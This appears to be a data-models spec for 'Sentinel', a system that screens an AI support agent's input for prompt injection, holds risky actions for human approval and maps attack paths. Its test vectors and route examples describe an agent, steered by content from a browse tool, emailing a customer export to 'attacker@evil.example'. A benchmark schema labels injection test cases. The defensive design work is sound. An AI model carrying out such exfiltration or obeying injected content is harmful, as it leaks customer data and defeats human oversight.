# Sentinel: Data Models

SQLite schema and JSON Schemas (draft 2020-12). Requirement IDs refer to `spec.md`. All JSON stored or hashed uses canonical JSON (D-23). Confidences are integer 0 to 100 (D-20).

## 1. Database schema (SQLite, WAL)

```sql
PRAGMA journal_mode=WAL; PRAGMA foreign_keys=ON;

CREATE TABLE users (
  user_id TEXT PRIMARY KEY,               -- alice, bob, admin, dana
  display_name TEXT NOT NULL,
  roles_json TEXT NOT NULL,               -- ["requester"] | ["approver"] | ["admin","approver"]
  password_hash TEXT NOT NULL             -- demo only (D-25)
);

CREATE TABLE agents (
  agent_id TEXT PRIMARY KEY,              -- supportbot
  name TEXT NOT NULL,
  status TEXT NOT NULL CHECK (status IN ('active','suspended')),
  allowed_action_types_json TEXT NOT NULL,
  graph_node_id TEXT NOT NULL,            -- agent:supportbot
  api_key_hash TEXT NOT NULL              -- SHA-256(pepper || secret)
);

CREATE TABLE action_types (
  action_type TEXT PRIMARY KEY,
  definition_json TEXT NOT NULL           -- see section 2.2
);

CREATE TABLE policy_versions (
  version INTEGER PRIMARY KEY,
  parent_version INTEGER,
  content_json TEXT NOT NULL,             -- canonical policy document
  content_hash TEXT NOT NULL,             -- SHA-256 of content_json
  created_by TEXT NOT NULL,
  approved_by TEXT,
  created_at TEXT NOT NULL,
  activated_at TEXT                       -- NULL until approved
);
CREATE TRIGGER policy_no_update BEFORE UPDATE OF content_json, content_hash, version ON policy_versions
BEGIN SELECT RAISE(ABORT,'policy versions are immutable'); END;
CREATE TRIGGER policy_no_delete BEFORE DELETE ON policy_versions
BEGIN SELECT RAISE(ABORT,'policy versions are immutable'); END;

CREATE TABLE sessions (
  session_id TEXT PRIMARY KEY,
  agent_id TEXT NOT NULL REFERENCES agents(agent_id),
  owner_user_id TEXT NOT NULL REFERENCES users(user_id),
  taint_level INTEGER NOT NULL DEFAULT 0 CHECK (taint_level BETWEEN 0 AND 2),
  taint_reasons_json TEXT NOT NULL DEFAULT '[]',
  created_at TEXT NOT NULL
);

CREATE TABLE actions (
  action_id TEXT PRIMARY KEY,
  session_id TEXT NOT NULL REFERENCES sessions(session_id),
  agent_id TEXT NOT NULL,
  action_type TEXT NOT NULL,
  arguments_json TEXT NOT NULL,           -- canonical, stored as submitted (protected values already blocked at step 5)
  target TEXT,
  fingerprint TEXT NOT NULL,
  requester TEXT NOT NULL,                -- session owner
  outcome TEXT NOT NULL CHECK (outcome IN ('allow','block','hold')),
  reason TEXT NOT NULL,
  rule_ids_json TEXT NOT NULL,
  decision_path TEXT NOT NULL CHECK (decision_path IN ('rules','rules+llm','fallback')),
  policy_version INTEGER NOT NULL,
  signals_json TEXT NOT NULL,             -- impact, blast, taint, llm summary (advisory)
  status TEXT NOT NULL,                   -- decided | executed | execution_failed | superseded
  created_at TEXT NOT NULL,
  executed_at TEXT
);
CREATE INDEX actions_by_session ON actions(session_id);

CREATE TABLE approvals (
  approval_id TEXT PRIMARY KEY,
  kind TEXT NOT NULL CHECK (kind IN ('action','ingress_review','policy.update')),
  action_id TEXT,                         -- action id, review id, or proposal id
  fingerprint TEXT NOT NULL,
  requester TEXT NOT NULL,
  approver TEXT,
  decision TEXT CHECK (decision IN ('approve','reject')),
  status TEXT NOT NULL CHECK (status IN ('pending','approved','rejected','expired','consumed')),
  created_at TEXT NOT NULL,
  ts TEXT,                                -- decision time
  expires_at TEXT NOT NULL,
  used INTEGER NOT NULL DEFAULT 0,
  used_at TEXT,
  signature TEXT                          -- HMAC, set at decision time
);

CREATE TABLE ingress_reviews (
  review_id TEXT PRIMARY KEY,
  session_id TEXT NOT NULL,
  source_tier TEXT NOT NULL,
  source_ref TEXT NOT NULL,
  text_encrypted_or_plain TEXT NOT NULL,  -- original text, needed for release. Protected values redacted before storage (LG-04).
  findings_json TEXT NOT NULL,
  status TEXT NOT NULL                    -- pending | released | rejected
);

CREATE TABLE ledger (
  seq INTEGER PRIMARY KEY,                -- starts at 1, contiguous
  ts TEXT NOT NULL,
  module TEXT NOT NULL CHECK (module IN ('promptshield','actiongate','breachpath','policy','auth')),
  event_type TEXT NOT NULL,
  subject TEXT NOT NULL,                  -- agent:supportbot or user:alice
  outcome TEXT NOT NULL,                  -- allow|block|hold|sanitize|escalate|ok|refused|info
  reason TEXT NOT NULL,
  rule_ids_json TEXT NOT NULL,
  decision_path TEXT NOT NULL,            -- rules | rules+llm | fallback | n/a
  policy_version INTEGER NOT NULL,
  payload_ref TEXT,
  payload_digest TEXT NOT NULL,
  prev_hash TEXT NOT NULL,
  hash TEXT NOT NULL UNIQUE
);
CREATE TRIGGER ledger_no_update BEFORE UPDATE ON ledger BEGIN SELECT RAISE(ABORT,'ledger is append-only'); END;
CREATE TRIGGER ledger_no_delete BEFORE DELETE ON ledger BEGIN SELECT RAISE(ABORT,'ledger is append-only'); END;

CREATE TABLE ledger_payloads (            -- redacted payloads (D-24)
  payload_id TEXT PRIMARY KEY,
  payload_json TEXT NOT NULL              -- canonical, secrets replaced by [REDACTED:id]
);

CREATE TABLE graph_versions (
  graph_version INTEGER PRIMARY KEY,
  parent_version INTEGER,
  graph_json TEXT NOT NULL,               -- full snapshot, section 3
  change_json TEXT NOT NULL,              -- change list that produced it, or "seed"
  created_by TEXT NOT NULL,
  created_at TEXT NOT NULL,
  content_hash TEXT NOT NULL
);

CREATE TABLE protected_values (
  pv_id TEXT PRIMARY KEY,                 -- pv-apikey-1, pv-nid-1, pv-marker-1
  kind TEXT NOT NULL CHECK (kind IN ('canary','secret','national_id')),
  value_norm TEXT NOT NULL,               -- normalized form, held only here. Never logged.
  min_len INTEGER NOT NULL DEFAULT 8
);

CREATE TABLE customers (                  -- Faker, seed 1337
  customer_id INTEGER PRIMARY KEY, name TEXT, email TEXT, phone TEXT, order_total_cents INTEGER,
  internal_notes TEXT                     -- canary values live here. Executors never return this column (D-22).
);
CREATE TABLE marketing_prefs (contact_id INTEGER PRIMARY KEY, email TEXT, opted_in INTEGER);

CREATE TABLE outbox (outbox_id INTEGER PRIMARY KEY AUTOINCREMENT, action_id TEXT, ts TEXT, to_json TEXT, subject TEXT, body_excerpt TEXT, simulated INTEGER DEFAULT 1);
CREATE TABLE fakedb_ops (op_id INTEGER PRIMARY KEY AUTOINCREMENT, action_id TEXT, ts TEXT, op TEXT, resource TEXT, record_count INTEGER, simulated INTEGER DEFAULT 1);
CREATE TABLE exec_tokens_used (nonce TEXT PRIMARY KEY, used_at TEXT NOT NULL);

CREATE TABLE benchmark_runs (run_id TEXT PRIMARY KEY, ts TEXT, split TEXT, policy_version INTEGER, result_json TEXT);
```

## 2. JSON Schemas

### 2.1 Decision (`kind` ingress or action or policy_change)

```json
{
  "$id": "sentinel/decision.schema.json",
  "type": "object",
  "required": ["request_id","kind","outcome","reason","rule_ids","decision_path","policy_version","signals"],
  "additionalProperties": false,
  "properties": {
    "request_id": {"type": "string"},
    "kind": {"enum": ["ingress","action","policy_change"]},
    "outcome": {"enum": ["allow","block","hold","sanitize","escalate"]},
    "reason": {"type": "string", "maxLength": 300},
    "rule_ids": {"type": "array", "items": {"type": "string"}},
    "decision_path": {"enum": ["rules","rules+llm","fallback"]},
    "policy_version": {"type": "integer", "minimum": 1},
    "signals": {
      "type": "object",
      "properties": {
        "impact": {"type": "object", "properties": {"level": {"enum": ["low","medium","high"]}, "score": {"type": "integer"}, "factors": {"type": "array", "items": {"type": "string"}}}},
        "blast": {"type": "object"},
        "taint_level": {"type": "integer", "minimum": 0, "maximum": 2},
        "llm": {"type": ["object","null"]},
        "findings": {"type": "array", "items": {"$ref": "#/$defs/finding"}}
      }
    },
    "action_id": {"type": ["string","null"]},
    "approval_id": {"type": ["string","null"]}
  },
  "$defs": {
    "finding": {
      "type": "object",
      "required": ["type","confidence_pct","detector"],
      "properties": {
        "type": {"enum": ["override","extraction","exfil_target","protected_value","hidden_content","directive"]},
        "start": {"type": ["integer","null"]}, "end": {"type": ["integer","null"]},
        "confidence_pct": {"type": "integer", "minimum": 0, "maximum": 100},
        "evidence": {"type": "string", "maxLength": 80},
        "encoding": {"type": "string"},
        "signals": {"type": "array", "items": {"type": "string"}},
        "detector": {"enum": ["D1","D2","D3","D4","D5","D6"]},
        "weak": {"type": "boolean"}
      }
    }
  }
}
```

Example (demo step 4):

```json
{
  "request_id": "req_000014", "kind": "action", "outcome": "hold",
  "reason": "External recipient requires human approval",
  "rule_ids": ["AG-R-H01","AG-R-H02","AG-R-H05","AG-R-H09"],
  "decision_path": "rules+llm", "policy_version": 1,
  "signals": {
    "impact": {"level": "high", "score": 85, "factors": ["IMP-SENS","IMP-IRREV","IMP-EXTERNAL"]},
    "blast": {"level": "high", "on_attack_path": true, "paths_count": 2, "min_distance_to_sensitive": 1, "max_sensitivity_reachable": "high"},
    "taint_level": 2,
    "llm": {"summary": "Sends a customer export to an address outside acme.example.", "risk_flags": ["external_recipient","bulk_data"], "suggested_outcome": "hold", "label": "advisory"}
  },
  "action_id": "act_000007", "approval_id": "apr_000003"
}
```

### 2.2 Action-type registry entry

```json
{
  "$id": "sentinel/action-type.schema.json",
  "type": "object",
  "required": ["action_type","arg_schema","reversible","base_sensitivity","target_field","description"],
  "additionalProperties": false,
  "properties": {
    "action_type": {"type": "string", "pattern": "^[a-z]+\\.[a-z_]+$"},
    "arg_schema": {"type": "object"},
    "reversible": {"type": "boolean"},
    "base_sensitivity": {"enum": ["low","medium","high"]},
    "target_field": {"type": ["string","null"], "description": "JSON pointer into arguments"},
    "target_node_field": {"type": ["string","null"]},
    "target_node_default": {"type": ["string","null"]},
    "external_destination_fields": {"type": "array", "items": {"type": "string"}},
    "record_count": {"type": "object", "properties": {"pointer": {"type": "string"}, "mode": {"enum": ["value","length","const"]}, "const": {"type": "integer"}}},
    "max_records_auto": {"type": "integer", "minimum": 0},
    "max_records_hard": {"type": "integer", "minimum": 0},
    "ingests_untrusted": {"type": "boolean", "default": false},
    "tool_node": {"type": ["string","null"]},
    "output_tier": {"enum": ["retrieved_document","tool_output", null]},
    "description": {"type": "string"}
  }
}
```

### 2.3 Agent registry entry

```json
{
  "type": "object",
  "required": ["agent_id","name","status","allowed_action_types","graph_node_id"],
  "properties": {
    "agent_id": {"type": "string"}, "name": {"type": "string"},
    "status": {"enum": ["active","suspended"]},
    "allowed_action_types": {"type": "array", "items": {"type": "string"}},
    "graph_node_id": {"type": "string"}
  }
}
```

### 2.4 Proposed action (agent-plane request body)

```json
{
  "$id": "sentinel/action-proposal.schema.json",
  "type": "object",
  "required": ["session_id","action_type","arguments"],
  "additionalProperties": false,
  "properties": {
    "session_id": {"type": "string"},
    "action_type": {"type": "string", "maxLength": 64},
    "arguments": {"type": "object"}
  }
}
```

`agent_id` is deliberately absent. Its presence is rejected (AU-01).

### 2.5 Approval record

```json
{
  "$id": "sentinel/approval.schema.json",
  "type": "object",
  "required": ["approval_id","kind","action_id","fingerprint","requester","status","expires_at"],
  "properties": {
    "approval_id": {"type": "string"},
    "kind": {"enum": ["action","ingress_review","policy.update"]},
    "action_id": {"type": "string"},
    "fingerprint": {"type": "string", "pattern": "^[0-9a-f]{64}$"},
    "requester": {"type": "string"},
    "approver": {"type": ["string","null"]},
    "decision": {"enum": ["approve","reject", null]},
    "status": {"enum": ["pending","approved","rejected","expired","consumed"]},
    "ts": {"type": ["string","null"]},
    "expires_at": {"type": "string"},
    "used": {"type": "boolean"},
    "signature": {"type": ["string","null"]},
    "review": {
      "description": "Reviewer view (AG-15). Present on GET only.",
      "type": "object",
      "properties": {
        "action": {"type": "object"},
        "llm_summary": {"type": "object", "properties": {"text": {"type": "string"}, "label": {"const": "advisory"}, "available": {"type": "boolean"}}},
        "rule_ids": {"type": "array"}, "taint_level": {"type": "integer"}, "blast": {"type": "object"}
      }
    }
  }
}
```

### 2.6 Ledger entry

```json
{
  "$id": "sentinel/ledger-entry.schema.json",
  "type": "object",
  "additionalProperties": false,
  "required": ["seq","ts","module","event_type","subject","outcome","reason","rule_ids","decision_path","policy_version","payload_ref","payload_digest","prev_hash","hash"],
  "properties": {
    "seq": {"type": "integer", "minimum": 1},
    "ts": {"type": "string", "pattern": "^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{3}Z$"},
    "module": {"enum": ["promptshield","actiongate","breachpath","policy","auth"]},
    "event_type": {"type": "string"},
    "subject": {"type": "string"},
    "outcome": {"type": "string"},
    "reason": {"type": "string", "maxLength": 300},
    "rule_ids": {"type": "array", "items": {"type": "string"}},
    "decision_path": {"enum": ["rules","rules+llm","fallback","n/a"]},
    "policy_version": {"type": "integer"},
    "payload_ref": {"type": ["string","null"]},
    "payload_digest": {"type": "string", "pattern": "^[0-9a-f]{64}$"},
    "prev_hash": {"type": "string", "pattern": "^[0-9a-f]{64}$"},
    "hash": {"type": "string", "pattern": "^[0-9a-f]{64}$"}
  }
}
```

## 3. Graph model (BreachPath)

```json
{
  "$id": "sentinel/graph.schema.json",
  "type": "object",
  "required": ["nodes","edges"],
  "additionalProperties": false,
  "properties": {
    "schema": {"const": "sentinel.graph/1"},
    "name": {"type": "string", "maxLength": 200},
    "settings": {
      "type": "object", "additionalProperties": false,
      "properties": {
        "max_depth": {"type": "integer", "minimum": 1, "maximum": 8, "default": 4},
        "max_paths": {"type": "integer", "minimum": 1, "maximum": 10000, "default": 1000},
        "time_budget_ms": {"type": "integer", "minimum": 100, "maximum": 10000, "default": 2000},
        "sensitive_min": {"enum": ["low","medium","high","critical"], "default": "medium"}
      }
    },
    "nodes": {"type": "array", "maxItems": 500, "items": {"$ref": "#/$defs/node"}},
    "edges": {"type": "array", "maxItems": 2000, "items": {"$ref": "#/$defs/edge"}}
  },
  "$defs": {
    "id": {"type": "string", "pattern": "^[a-z0-9][a-z0-9_.:-]{0,63}$"},
    "attrs": {"type": "object", "maxProperties": 20, "additionalProperties": {"type": ["string","number","boolean"]}},
    "node": {
      "type": "object", "additionalProperties": false,
      "required": ["id","type","name"],
      "properties": {
        "id": {"$ref": "#/$defs/id"},
        "type": {"enum": ["user","role","service","agent","tool","asset","external"]},
        "name": {"type": "string", "maxLength": 200},
        "entry_point": {"type": "boolean", "default": false},
        "sensitivity": {"enum": ["none","low","medium","high","critical"], "default": "none"},
        "entry_source": {"enum": ["manual","derived", null], "default": null},
        "attrs": {"$ref": "#/$defs/attrs"}
      }
    },
    "edge": {
      "type": "object", "additionalProperties": false,
      "required": ["id","src","dst","type"],
      "properties": {
        "id": {"$ref": "#/$defs/id"}, "src": {"$ref": "#/$defs/id"}, "dst": {"$ref": "#/$defs/id"},
        "type": {"enum": ["member_of","can_assume","can_invoke","can_read","can_write","trusts","network_reachable","ingests_from","calls"]},
        "attrs": {"$ref": "#/$defs/attrs"}
      }
    }
  }
}
```

Referential checks (dangling `src`/`dst`, duplicate IDs) are done in code after schema validation, with pointers. Schema errors alone never reach referential checks on the failing items, but all independent errors are collected.

Route output:

```json
{
  "graph_version": 2, "max_depth": 4, "truncated": false, "truncation_reason": null, "warning": null,
  "routes": [{
    "path_id": "p_460263f0bbf3", "entry": "tool:browse_page", "asset": "asset:customer_db",
    "asset_sensitivity": "high", "length": 3,
    "steps": [
      {"from": "tool:browse_page", "edge_id": "e-agent-ingest-bp", "edge_type": "ingests_from", "to": "agent:supportbot", "reversed": true,
       "text": "Content controlled at Browse Page tool is ingested by SupportBot, so whoever controls it can steer SupportBot."},
      {"from": "agent:supportbot", "edge_id": "e-agent-invoke-mailer", "edge_type": "can_invoke", "to": "svc:mailer", "reversed": false, "text": "SupportBot can invoke Mailer."},
      {"from": "svc:mailer", "edge_id": "e-mailer-read-customerdb", "edge_type": "can_read", "to": "asset:customer_db", "reversed": false, "text": "Mailer can read Customer DB."}
    ],
    "summary": "From Browse Page tool to Customer DB (high) in 3 steps.",
    "short": "SupportBot can invoke Mailer, which can read Customer DB."
  }]
}
```

Diff output:

```json
{
  "from_version": 2, "to_version": 3, "comparison_reliable": true,
  "removed": ["p_3f50b1ef2c19","p_65cc13b03940"],
  "remaining": ["p_460263f0bbf3","p_f2b0d9ef9b38","p_0752c1232b17","p_f99cb064dd75","p_54422463a590"],
  "new": [],
  "routes": {"removed": [ /* full route objects */ ], "new": [ /* full route objects */ ]}
}
```

Change list:

```json
{"expected_version": 2, "changes": [
  {"op": "add_edge", "edge": {"id": "e-reporting-read-customerdb", "src": "svc:reporting", "dst": "asset:customer_db", "type": "can_read"}},
  {"op": "remove_edge", "edge_id": "e-agent-read-customerdb"},
  {"op": "set_entry_point", "node_id": "svc:crm", "value": true},
  {"op": "set_sensitivity", "node_id": "asset:marketing_db", "value": "medium"},
  {"op": "set_settings", "settings": {"max_depth": 5}}
]}
```

Blast radius response:

```json
{"node_id": "svc:mailer", "on_attack_path": true, "paths_count": 2, "min_distance_to_sensitive": 1, "max_sensitivity_reachable": "high", "level": "high", "reason": null}
```

## 4. Test vectors (verified by computation; implementers must reproduce them)

**Genesis `prev_hash`** = `SHA-256("sentinel-genesis-v1")`:

```
2f745ab9924bc856fd61fba522a567c3b1f15713d504c53cca931c2ef85180c2
```

**Ledger entry 1.** Payload `{"user":"alice"}` has digest `a5cd97f8496e61268797de605913bd8a29ac3af68ec6af1bea67fdb50c2c0ebf`. Canonical JSON of the entry without `hash`:

```
{"decision_path":"rules","event_type":"auth.login","module":"auth","outcome":"allow","payload_digest":"a5cd97f8496e61268797de605913bd8a29ac3af68ec6af1bea67fdb50c2c0ebf","payload_ref":null,"policy_version":1,"prev_hash":"2f745ab9924bc856fd61fba522a567c3b1f15713d504c53cca931c2ef85180c2","reason":"login ok","rule_ids":[],"seq":1,"subject":"user:alice","ts":"2026-01-01T00:00:00.000Z"}
```

`hash = SHA-256(prev_hash_ascii || canonical_json)`:

```
0e0227242a0c8ee3c3f135c98e7ef5645caf09bde92819a183e3af00b670d3fc
```

**Action fingerprint.** Input:

```
{"action_type":"email.send","agent_id":"supportbot","arguments":{"body":"Alice A,alice@x.example,120.50","resource":"svc:mailer","subject":"Customer export","to":["attacker@evil.example"]},"target":"svc:mailer"}
```

Fingerprint: `766d9af15e446fd6612403548807dccded155d74b1b1bf2b4717059b07899bda`. Changing one character of `body` must change it.

**Path ID.** `p_` + first 12 hex of SHA-256 of edge IDs joined with `|`. Example: `e-agent-ingest-bp|e-agent-invoke-mailer|e-mailer-read-customerdb` gives `p_460263f0bbf3`.

## 5. Ledger payload shapes (redacted)

| `event_type` | Payload keys |
| --- | --- |
| `ingress.screened` | `session_id, source_tier, source_ref, text_digest, text_len, findings[{type, confidence_pct, encoding, start, end, evidence_redacted}], removed_spans[{type, start, end}], llm{status}, taint{before, after}` |
| `action.decided` | `action_id, session_id, action_type, target, fingerprint, args_digest, args_excerpt_redacted, signals` |
| `approval.*` | `approval_id, action_id, fingerprint, requester, approver, reason_code` |
| `graph.changed` | `from_version, to_version, changes, diff{removed, remaining, new}` as path IDs |
| `policy.proposed` | `base_version, diff, fingerprint, lint_warnings` |
| `llm.fallback` | `component, mode, reason, consecutive_failures, request_id` |

## 6. Policy document

The policy JSON Schema and the complete v1 are in `policy-spec.md` sections 2 and 6.

## 7. LLM result schemas

```json
{
  "classify_input": {
    "type": "object", "additionalProperties": false,
    "required": ["label","threat_types","confidence"],
    "properties": {
      "label": {"enum": ["benign","suspicious","malicious"]},
      "threat_types": {"type": "array", "items": {"enum": ["override","extraction","exfil_target","protected_value","hidden_content","directive"]}},
      "confidence": {"type": "integer", "minimum": 0, "maximum": 100},
      "rationale": {"type": "string", "maxLength": 200}
    }
  },
  "summarize_intent": {
    "type": "object", "additionalProperties": false,
    "required": ["summary","risk_flags","suggested_outcome"],
    "properties": {
      "summary": {"type": "string", "maxLength": 300},
      "risk_flags": {"type": "array", "items": {"enum": ["external_recipient","bulk_data","irreversible","sensitive_resource","taint_context","unusual_target"]}},
      "suggested_outcome": {"enum": ["allow","hold","block"]}
    }
  }
}
```

`block` is a valid suggestion but is only displayed. The engine never applies it (D-07).

## 8. Session

```json
{"session_id": "sess_demo0001", "agent_id": "supportbot", "owner_user_id": "alice", "taint_level": 2,
 "taint_label": "flagged",
 "taint_reasons": [{"ts": "2026-01-01T00:01:02.000Z", "source_ref": "review-p2", "cause": "ingress sanitize exfil_target", "ledger_seq": 12}],
 "created_at": "2026-01-01T00:00:10.000Z"}
```

## 9. Benchmark case

```json
{
  "$id": "sentinel/benchmark-case.schema.json",
  "type": "object", "additionalProperties": false,
  "required": ["id","text","source_tier","label","category","attack_style","provenance","split"],
  "properties": {
    "id": {"type": "string", "pattern": "^bm-\\d{3}$"},
    "text": {"type": "string"},
    "source_tier": {"enum": ["user","retrieved_document","tool_output"]},
    "label": {"enum": ["malicious","benign"]},
    "category": {"enum": ["override","extraction","exfil_target","protected_value","hidden_content","directive","benign_plain","benign_tricky","benign_security_text"]},
    "attack_style": {"enum": ["direct","indirect","none"]},
    "provenance": {"type": "object", "required": ["source"], "properties": {"source": {"enum": ["team","deepset/prompt-injections","BIPIA","InjecAgent","AgentDojo"]}, "url": {"type": "string"}, "license": {"type": "string"}, "original_id": {"type": "string"}, "modified": {"type": "boolean"}}},
    "split": {"enum": ["dev","test"]},
    "known_hard": {"type": "boolean", "description": "Marked at authoring time (paraphrase, multi-turn, non-English, obfuscation). Never set after seeing results."},
    "expected_clean_substrings": {"type": "array", "items": {"type": "string"}, "description": "For malicious indirect cases: legitimate text that must survive sanitize."}
  }
}
```

Note on `deepset/prompt-injections` labels: its label `1` means injection. Map `1 -> malicious`, `0 -> benign`. Wrap its mostly `user`-style text in tier `user`.
